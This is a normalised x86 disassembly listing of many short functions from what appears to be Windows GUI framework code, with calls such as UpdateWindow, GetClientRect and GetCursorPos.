cmp [ eax + 0xd ] 0x0
je r-xdata
pop esi
retn
cmp [ edx + 0x4 ] 0x0
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_448c2c
push ebx
mov ebx eax
cmp [ ebx + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x30 ]
mov dl [ eax + 0x99 ]
mov eax ebx
call sub_4470d4
mov [ ebx + 0x9a ] 0x1
sub_448c84
push ebx
mov ebx eax
cmp [ ebx + 0x56 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x84 ]
mov eax ebx
call sub_447078
mov [ ebx + 0x56 ] 0x1
sub_448ca8
mov [ edx + 0xc ] 0x1
retn
sub_448cb0
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
push eax
xor ecx ecx
mov eax edx
mov edx 0xb013
call sub_448138
sub_448cc8
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
push eax
xor ecx ecx
mov eax edx
mov edx 0xb014
call sub_448138
sub_448ce0
xor eax eax
mov [ edx + 0xc ] eax
retn
sub_448f46
jmp sub_403b24
sub_448f4d
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_448f78
mov eax [ r-xdata ]
retn
sub_449114
jmp sub_403b24
sub_44911b
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44923c
mov eax [ eax + 0xb8 ]
retn
sub_4492a4
push ebx
mov ebx eax
mov eax ebx
call sub_4475c8
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax 0x20000
pop ebx
retn
sub_4492c0
mov edx [ eax + 0x6c ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x1c ]
sub_449458
mov eax [ eax + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_449488
mov edx [ eax ]
call [ edx + 0x34 ]
retn
sub_449490
call sub_446044
retn
sub_449590
jmp sub_403b24
sub_449750
jmp sub_403b24
sub_4497a0
jmp sub_403b24
sub_4497d8
retn
sub_449a61
jmp sub_403b24
sub_449be9
jmp sub_403b24
sub_449f4b
jmp sub_403b24
sub_449ff7
jmp sub_403b24
sub_44a004
inc [ eax + 0x160 ]
retn
sub_44a00c
dec [ eax + 0x160 ]
cmp [ eax + 0x160 ] 0x0
jne r-xdata
retn
test [ eax + 0x54 ] 0x10
je r-xdata
call sub_44a02c
sub_44a02c
xor edx edx
call sub_449f70
retn
sub_44a0f9
jmp sub_403b24
sub_44a100
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44a1ef
jmp sub_403b24
sub_44a716
jmp sub_403b24
sub_44a71d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44a8e5
jmp sub_403b24
sub_44a8ec
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44a9c0
mov ecx [ eax ]
cmp ecx [ edx ]
jne r-xdata
xor eax eax
retn
mov eax [ eax + 0x4 ]
cmp eax [ edx + 0x4 ]
je r-xdata
mov al 0x1
retn
sub_44abad
jmp sub_403b24
sub_44abb4
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x180 ] edx
pop ecx
pop ebp
retn
sub_44aca4
xor eax eax
retn
sub_44ad0c
cmp [ eax + 0x180 ] 0x0
je r-xdata
retn
push 0x0
xor ecx ecx
mov edx 0xb033
call sub_448138
sub_44ae3a
jmp sub_403870
sub_44af6f
jmp sub_403b24
sub_44af76
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44af80
jmp sub_403870
sub_44af85
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_466be8
call sub_403bd8
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44b540
jmp sub_403b24
sub_44b547
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44b550
add esp 0xfffffff0
mov [ esp ] 0xf
mov [ esp + 0x4 ] edx
xor edx edx
mov [ esp + 0x8 ] edx
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
mov ecx [ eax ]
call [ ecx - 0x10 ]
add esp 0x10
retn
sub_44ba4e
jmp sub_403b24
sub_44baa0
push ebx
mov ebx eax
call sub_426490
push 0x0
xor ecx ecx
mov edx 0xb024
mov eax ebx
call sub_448138
pop ebx
retn
sub_44babc
mov ecx [ edx + 0x8 ]
push ecx
mov ecx [ edx + 0x4 ]
mov edx 0xb025
call sub_448138
retn
sub_44bad0
push 0x0
xor ecx ecx
mov edx 0xb026
call sub_448138
retn
sub_44bae0
push 0x0
xor ecx ecx
mov edx 0xb027
call sub_448138
retn
sub_44bd8c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_44dab4
pop esi
retn
sub_44bea0
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_44bef0
pop esi
retn
sub_44beb4
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_44bfdc
pop esi
retn
sub_44bec8
push esi
mov esi eax
mov [ esi + 0x1f9 ] 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_44bedc
push esi
mov esi eax
mov [ esi + 0x1f9 ] 0x0
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_44bfcf
jmp sub_403b24
sub_44bfd6
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44c066
jmp sub_403b24
sub_44c06d
pop ebx
pop ecx
pop ebp
retn
sub_44c074
push esi
mov esi edx
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x68 ]
pop esi
retn
sub_44c084
retn
sub_44c088
push ebx
cmp [ eax + 0x1c2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c4 ]
call [ ebx + 0x1c0 ]
sub_44c0a8
push ebx
cmp [ eax + 0x1ca ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1cc ]
call [ ebx + 0x1c8 ]
sub_44c208
mov edx [ eax + 0x178 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_44c2d8
retn
sub_44c3f0
jmp sub_403b24
sub_44c3f7
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44c4c2
jmp sub_403b24
sub_44c4ec
xor ecx ecx
mov [ edx + 0xc ] ecx
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
retn
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov edx [ edx + 0x8 ]
mov eax [ eax + 0x17c ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
sub_44c57e
jmp sub_403b24
sub_44c750
push ebx
cmp [ eax + 0x1e2 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1e4 ]
call [ ebx + 0x1e0 ]
sub_44c9f4
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor eax eax
mov [ esi + 0x180 ] eax
mov [ esi + 0x1a6 ] 0x0
pop esi
retn
sub_44cad0
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov dx 0xb023
mov eax esi
call sub_44a4fc
pop esi
retn
sub_44cb94
push esi
mov si 0xffc1
call sub_40358c
pop esi
retn
sub_44cbc0
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_44cbd4
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_44cbe8
call sub_44a4bc
retn
sub_44cbf0
call sub_44a4bc
retn
sub_44cbf8
call sub_44a4bc
retn
sub_44cca0
push ebx
mov ebx eax
mov eax ebx
call sub_448b54
mov edx [ ebx + 0x70 ]
mov eax [ ebx + 0x170 ]
call sub_427608
mov dx 0xb009
mov eax ebx
call sub_44a4fc
pop ebx
retn
sub_44ce04
call sub_44a4bc
retn
sub_44ce0c
call sub_44a4bc
retn
sub_44ce14
call sub_44a4bc
retn
sub_44ce1c
call sub_44a4bc
retn
sub_44ce80
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_44d316
jmp sub_403b24
sub_44d31d
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44d3fc
push esi
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
pop esi
retn
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xc0 ]
sub_44d5a0
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
mov eax [ eax + 0x190 ]
retn
mov eax edx
call sub_44d7a4
retn
sub_44d5b8
jmp r-xdata
mov edx [ eax + 0x30 ]
test edx edx
jne r-xdata
mov eax edx
mov edx [ eax + 0x190 ]
test edx edx
jne r-xdata
mov eax edx
retn
call sub_44d7a4
mov edx eax
sub_44d5d8
push 0x0
xor ecx ecx
mov edx 0xb034
call sub_448138
retn
sub_44d678
push ebx
mov ebx eax
mov eax ebx
call sub_44daa8
test al al
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x180 ]
push eax
call UpdateWindow
sub_44d694
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x88 ]
pop ebx
retn
sub_44d86c
push ebx
push esi
mov esi edx
mov ebx eax
push esi
mov eax ebx
call sub_44d7a4
push eax
call GetClientRect
pop esi
pop ebx
retn
sub_44d8c4
cmp edx [ eax + 0x16c ]
je r-xdata
retn
mov [ eax + 0x16c ] edx
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_448138
sub_44d8e4
cmp dl [ eax + 0x1a5 ]
je r-xdata
retn
mov [ eax + 0x1a5 ] dl
mov [ eax + 0x1a9 ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb010
call sub_448138
sub_44d908
mov al [ eax + 0x1a9 ]
xor al 0x1
retn
sub_44d914
cmp dl [ eax + 0x1a9 ]
je r-xdata
retn
mov [ eax + 0x1a9 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb011
call sub_448138
sub_44d9c0
test [ eax + 0x54 ] 0x8
je r-xdata
call sub_44d964
retn
movsx edx dx
mov [ eax + 0x1a0 ] edx
retn
sub_44da9c
jmp sub_403b24
sub_44daa3
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44dcc2
jmp sub_403b24
sub_44dcc9
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_44ddd0
call sub_447f08
retn
sub_44e21e
jmp sub_403b24
sub_44e2b4
mov eax [ r-xdata ]
retn
sub_44e41b
jmp sub_403b24
sub_44e52c
cmp dl [ eax + 0x165 ]
je r-xdata
retn
mov [ eax + 0x165 ] dl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_448138
sub_44e842
jmp sub_403b24
sub_44e984
test [ eax + 0x52 ] 0x4
setne al
retn
sub_44eae0
jmp sub_403b24
sub_44eae7
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_427c48
retn
sub_44eb03
jmp sub_403b24
sub_44eb10
retn
sub_44ebe4
mov [ edx + 0xc ] 0xffffffff
retn
sub_44ec42
jmp sub_403b24
sub_44ec49
pop ecx
pop ecx
pop ebp
retn
sub_44ece9
jmp sub_403b24
sub_44ecf0
pop ebx
mov esp ebp
pop ebp
retn
sub_44ed5c
call sub_44acc4
retn
sub_44edef
jmp sub_403b24
sub_44edf6
pop esi
pop ecx
pop ecx
pop ebp
retn
sub_44efd5
jmp sub_403b24
sub_44efdc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44f1f8
jmp sub_403b24
sub_44f24c
cmp dx [ eax + 0x68 ]
je r-xdata
retn
mov [ eax + 0x68 ] dx
cmp [ eax + 0x6a ] 0x0
je r-xdata
call sub_44f138
sub_44f390
push ebx
mov ebx eax
mov eax ebx
call sub_45407c
test al al
je r-xdata
pop ebx
retn
push 0xffffffff
call ImageList_DragShowNolock
sub_44f3a8
push ebx
mov ebx eax
mov eax ebx
call sub_45407c
test al al
je r-xdata
pop ebx
retn
push 0x0
call ImageList_DragShowNolock
sub_44f494
push ebx
push esi
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x100
mov edx esi
mov eax ebx
call sub_44b8fc
and [ ebx + 0x54 ] 0xfeff
pop esi
pop ebx
retn
sub_44f52f
jmp sub_403b24
sub_44f536
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f559
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_427c48
retn
sub_44f552
jmp sub_403b24
sub_44f559
pop ebx
pop ecx
pop ebp
retn
sub_44f560
retn
sub_44f5c8
xor edx edx
mov eax [ eax + 0x8 ]
test eax eax
je r-xdata
mov eax edx
retn
mov eax [ eax + 0xc ]
inc edx
test eax eax
jne r-xdata
sub_44f935
jmp sub_403b24
sub_44fb1c
mov eax [ eax + 0x8 ]
jmp r-xdata
mov edx [ eax + 0xc ]
test edx edx
jne r-xdata
mov eax edx
retn
sub_44fd08
jmp sub_403b24
sub_44fdb8
mov eax [ eax + 0x14 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
add [ ecx + 0x4 ] 0xc
retn
add [ ecx ] 0xc
retn
sub_44fdcc
inc [ eax + 0x6c ]
retn
sub_44fdd0
dec [ eax + 0x6c ]
cmp [ eax + 0x6c ] 0x0
jg r-xdata
retn
xor edx edx
mov [ eax + 0x6c ] edx
call sub_451650
sub_44ff30
call sub_450630
test eax eax
je r-xdata
xor eax eax
retn
mov eax [ eax + 0x4 ]
retn
sub_4508db
jmp sub_403b24
sub_4508e2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4508ff
lea eax [ ebp - 0xc ]
call sub_404120
retn
sub_4508f8
jmp sub_403b24
sub_4508ff
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_450be0
jmp sub_403b24
sub_450be7
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450c04
mov eax [ ebp - 0x4 ]
call sub_427c48
retn
sub_450bfd
jmp sub_403b24
sub_450c04
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450c21
mov eax [ ebp - 0x4 ]
call sub_403390
retn
sub_450c1a
jmp sub_403b24
sub_450c21
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4510d5
jmp sub_403b24
sub_4510dc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_451267
jmp sub_403b24
sub_45126e
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_451323
jmp sub_403b24
sub_45132a
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_451418
jmp sub_403b24
sub_451469
jmp sub_403b24
sub_451470
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45152c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44fe3c
mov [ ebx + 0x38 ] eax
pop esi
pop ebx
retn
sub_451678
cmp [ eax + 0x6c ] 0x0
jne r-xdata
retn
mov eax edx
call sub_44f978
sub_451f78
jmp sub_403b24
sub_451f7f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_452048
call GetCapture
retn
sub_452050
push ebx
mov ebx edx
push ebx
call GetCursorPos
call sub_40d2e0
pop ebx
retn
sub_452060
push ebx
mov ebx eax
push 0x13
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb eax eax
inc eax
mov [ ebx + 0xc ] al
pop ebx
retn
sub_4522c6
jmp sub_403b24
sub_4524c0
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
retn
push eax
call [ rw-data ]
retn
sub_4526d4
jmp sub_403b24
sub_4526db
pop ebx
mov esp ebp
pop ebp
retn
sub_452787
jmp sub_403b24
sub_45278e
pop ebp
retn
sub_452816
jmp sub_403b24
sub_45281d
pop ebp
retn
sub_452f6c
mov edx [ eax + 0x5c ]
test edx edx
je r-xdata
or eax 0xffffffff
retn
mov edx [ edx + 0x30 ]
xchg edx eax
call sub_41b6b0
retn
sub_452f84
mov al 0x1
retn
sub_452f88
mov edx [ eax + 0x5c ]
test edx edx
je r-xdata
call sub_423ed8
retn
mov eax edx
retn
sub_452f98
cmp [ eax + 0x5c ] 0x0
je r-xdata
call sub_423ea8
retn
mov al 0x1
retn
sub_453288
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_41b654
pop esi
pop ebx
retn
sub_45329c
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x8 ]
retn
sub_4532d8
cmp edx [ eax + 0x38 ]
jne r-xdata
retn
mov edx [ eax ]
call [ edx + 0x30 ]
sub_45353c
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40351c
pop ebx
retn
sub_453550
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40351c
pop ebx
retn
sub_453564
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40351c
pop ebx
retn
sub_453578
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40351c
pop ebx
retn
sub_45358c
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40351c
pop ebx
retn
sub_4535a0
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40351c
pop ebx
retn
sub_4535b4
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40351c
pop ebx
retn
sub_4535c8
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40351c
pop ebx
retn
sub_4535dc
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40351c
pop ebx
retn
sub_4535f0
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40351c
pop ebx
retn
sub_453604
retn
sub_453608
retn
sub_45360c
retn
sub_453610
retn
sub_453614
retn
sub_453618
retn
sub_45361c
retn
sub_453620
retn
sub_453624
retn
sub_453628
retn
sub_45362c
retn
sub_453630
retn
sub_4538dc
jmp sub_403b24
sub_453c78
push ebx
mov ebx eax
cmp [ ebx + 0x90 ] 0x0
jne r-xdata
mov eax [ ebx + 0x90 ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov [ ebx + 0x90 ] eax
sub_453ca0
push esi
mov si 0xffef
call sub_40358c
pop esi
retn
sub_453d41
jmp sub_403b24
sub_453d48
pop ebp
retn
sub_453d4c
sub [ rw-data ] 0x1
jae r-xdata
retn
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_41acd4
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_41acd4
sub_453eec
mov edx eax
sub edx 0xff000000
je r-xdata
mov eax 0x20000000
sub edx 0xffffff
jne r-xdata
retn
mov eax 0x1fffffff
retn
sub_454071
jmp sub_403b24
sub_454078
pop ebx
pop ecx
pop ebp
retn
sub_45407c
cmp [ eax + 0x3c ] 0x0
setne al
retn
sub_454084
cmp [ eax + 0x3c ] 0x0
jne r-xdata
retn
call sub_454254
sub_454131
jmp sub_403b24
sub_454138
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x54 ]
test eax eax
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
call sub_403390
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x54 ] edx
sub_4542e7
jmp sub_403b24
sub_4542ee
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_454386
jmp sub_403b24
sub_45438d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4543aa
mov eax [ ebp - 0xc ]
call sub_403390
retn
sub_4543a3
jmp sub_403b24
sub_4543aa
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_40358c
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_454463
jmp sub_403b24
sub_45446a
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_454470
or edx 0xffffffff
call sub_4543e4
retn
sub_45487f
jmp sub_403b24
sub_454886
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4548a3
mov eax [ ebp - 0xc ]
call sub_403390
retn
sub_45489c
jmp sub_403b24
sub_4548a3
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4548c0
mov eax [ ebp - 0x4 ]
call sub_4553b8
retn
sub_4548b9
jmp sub_403b24
sub_4548c0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_454ac4
jmp sub_403b24
sub_454acb
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_454ad0
push esi
mov esi eax
cmp dl [ esi + 0x40 ]
je r-xdata
pop esi
retn
mov [ esi + 0x40 ] dl
mov eax esi
mov si 0xffef
call sub_40358c
sub_454ae8
push ebx
mov ebx edx
mov ecx ebx
xor edx edx
xor eax eax
call sub_419ff0
pop ebx
retn
sub_454b8c
mov [ edx + 0x4 ] eax
mov ecx [ eax + 0x4c ]
test ecx ecx
je r-xdata
retn
mov eax ecx
call sub_41b4f8
sub_454ca3
jmp sub_403b24
sub_454caa
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403390
retn
sub_454cc0
jmp sub_403b24
sub_454fd2
jmp sub_403b24
sub_454fd9
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454ff6
mov eax [ ebp - 0x10 ]
call sub_403390
retn
sub_454fef
jmp sub_403b24
sub_454ff6
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_455013
mov eax [ ebp - 0x8 ]
call sub_403390
retn
sub_45500c
jmp sub_403b24
sub_455013
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45507c
jmp sub_403b24
sub_455195
jmp sub_403b24
sub_4551b2
jmp sub_403b24
sub_45536a
jmp sub_403b24
sub_455371
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4553b4
inc [ eax + 0x5c ]
retn
sub_4553b8
push esi
cmp [ eax + 0x5c ] 0x0
jle r-xdata
cmp [ eax + 0x58 ] 0x0
je r-xdata
dec [ eax + 0x5c ]
pop esi
retn
mov [ eax + 0x58 ] 0x0
mov si 0xffef
call sub_40358c
sub_45540c
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx [ eax + 0x4 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_455449
jmp sub_403b24
sub_455450
pop ebp
retn
sub_455454
sub [ rw-data ] 0x1
retn
sub_45635f
jmp [ eax + eax ]
sub_4563bc
mov eax [ esp + 0x8 ]
retn
sub_4563c4
push ebx
mov ebx eax
call sub_4563bc
push eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd00
jmp sub_403b5c
sub_4563e0
pop ebx
retn
sub_456659
jmp sub_403b24
sub_456660
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4567ab
jmp sub_403b24
sub_4567b2
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4567c8
push ebx
mov eax [ rw-data ]
call sub_41bbac
mov ebx eax
movzx edx bx
mov cl 0x1
mov eax [ rw-data ]
call sub_41bb80
mov eax ebx
pop ebx
retn
sub_456950
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403540
mov [ ebx + 0x18 ] eax
pop esi
pop ebx
retn
sub_45696c
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403540
mov al [ eax + 0x95 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0xa8 ]
sete al
pop ebx
retn
sub_457067
jmp sub_403b24
sub_45706e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_457166
jmp sub_403b24
sub_45716d
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_457590
jmp sub_403b24
sub_457597
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_457a43
jmp sub_403b24
sub_457ee4
jmp sub_403b24
sub_457eeb
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45834f
jmp sub_403b24
sub_45880c
jmp sub_403b24
sub_458813
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_458bbe
jmp sub_403b24
sub_458bc5
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_458bd3
inc [ ecx ]
add [ eax ] al
add [ 0xffffffffb0000000 ] ch
add ebx eax
nop
cmp dl [ eax + 0x48 ]
je r-xdata
retn
mov [ eax + 0x48 ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_458d80
mov eax [ r-xdata ]
retn
sub_458dbc
cmp dx [ eax + 0x60 ]
je r-xdata
retn
mov [ eax + 0x60 ] dx
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_458dd0
cmp dl [ eax + 0x3e ]
je r-xdata
retn
mov [ eax + 0x3e ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_458de0
cmp edx [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] edx
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_458df0
or edx 0xffffffff
mov ecx [ eax + 0x64 ]
test ecx ecx
je r-xdata
mov eax edx
retn
mov edx eax
mov eax ecx
call sub_4590ec
mov edx eax
sub_458e88
push ebx
push esi
mov esi ecx
mov ebx edx
mov eax ebx
mov edx [ r-xdata ]
call sub_403540
mov edx esi
call sub_458e08
pop esi
pop ebx
retn
sub_458f04
mov edx [ eax + 0x44 ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x1c ]
sub_4590ec
push esi
or ecx 0xffffffff
mov esi [ eax + 0x5c ]
test esi esi
je r-xdata
mov eax ecx
pop esi
retn
mov eax esi
call sub_41b6b0
mov ecx eax
sub_4592dc
mov edx [ eax + 0x64 ]
test edx edx
je r-xdata
mov eax edx
retn
cmp [ edx + 0x70 ] 0x0
je r-xdata
mov eax [ edx + 0x70 ]
retn
sub_459344
jmp r-xdata
mov edx [ eax + 0x64 ]
test edx edx
jne r-xdata
mov eax edx
mov eax [ eax + 0x70 ]
retn
sub_4596ec
cmp edx [ eax + 0x7c ]
jne r-xdata
retn
call sub_459720
sub_459720
mov edx sub_4596f8
mov ecx eax
mov eax [ eax + 0x68 ]
xchg edx eax
call sub_456848
retn
sub_45990a
jmp sub_403b24
sub_459911
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_459da8
jmp sub_403b24
sub_459de7
jmp sub_403b24
sub_459dee
mov al [ ebp - 0x1a ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_459f8c
cmp dl [ eax + 0x3c ]
je r-xdata
retn
mov [ eax + 0x3c ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_45a0c8
push ebp
mov ebp esp
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ eax + 0x34 ]
mov si 0xfffd
call sub_40358c
pop esi
pop ebp
retn 0x8
sub_45a0e4
mov eax [ eax + 0x34 ]
call sub_45731c
retn
sub_45a0f0
push esi
mov esi eax
mov eax [ esi + 0x34 ]
mov si 0xfff9
call sub_40358c
pop esi
retn
sub_45a12c
push ebx
mov ecx sub_45a104
mov edx [ eax + 0x34 ]
mov ebx [ edx + 0x68 ]
mov eax edx
xchg ecx eax
mov edx ebx
call sub_456848
pop ebx
retn
sub_45a360
cmp [ eax + 0x40 ] 0x0
jne r-xdata
mov al 0x1
retn
cmp [ eax + 0x48 ] 0x0
jne r-xdata
xor eax eax
retn
sub_45a374
jmp r-xdata
test edx edx
jle r-xdata
retn
test eax eax
jne r-xdata
mov eax [ eax + 0x64 ]
dec edx
sub_45a4a9
jmp sub_403870
sub_45a5ab
jmp sub_403b24
sub_45a5d6
jmp sub_403b24
sub_45a5dd
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov al 0x1
cmp [ ebp - 0x14 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_45a5f4
mov al [ eax + 0x41 ]
xor al 0x1
retn
sub_45a7dc
cmp dl [ eax + 0x40 ]
je r-xdata
retn
